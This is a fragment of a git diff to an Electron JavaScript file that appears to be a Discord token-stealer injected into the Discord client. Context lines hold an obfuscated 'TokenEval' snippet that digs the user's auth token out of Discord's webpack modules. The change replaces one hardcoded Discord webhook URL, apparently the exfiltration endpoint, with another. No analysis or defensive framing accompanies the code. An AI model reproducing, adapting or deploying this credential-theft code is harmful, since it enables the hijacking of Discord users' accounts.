@@ -3,7 +3,7 @@ const path = require('path');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron')
 const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
-var webhook = "https://discord.com/api/webhooks/954634425084289034/RnCwNGs53uCJLtalrpJZdiARrY4EcZmTdcFTHAyxjJiE0VcjHpVeRKwcJawN0gOg1FU1";
+var webhook = "https://discord.com/api/webhooks/955456049773690880/m7Y78KPCPxSPYuR1chBUTVPRcovZcPgkhEGPRnA_l19a-IK5rZ_1f7O0Oh3YkK6VCbfE";
 var werlxdxd = "werlhb13"
 
 function FirstTime() {
